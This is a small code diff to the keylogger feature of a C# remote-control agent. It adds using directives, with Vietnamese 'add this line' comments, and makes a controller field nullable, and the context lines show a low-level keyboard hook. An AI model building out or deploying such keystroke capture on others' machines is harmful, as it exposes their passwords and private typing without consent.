@@ -1,6 +1,8 @@
 // Features/Keylogger.cs
 using System.Runtime.InteropServices;
 using System.Text.Json;
+using System.Windows.Forms;  // THÊM DÒNG NÀY
+using System.Diagnostics;   // THÊM DÒNG NÀY (nếu dùng Process)
 
 namespace RemoteControlAgent.Features
 {
@@ -9,7 +11,7 @@ namespace RemoteControlAgent.Features
         public string Action => "keylogger_start";
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        private static AgentController _controller;
+        private static AgentController? _controller;
 
         public void Execute(JsonElement request, AgentController controller)
         {
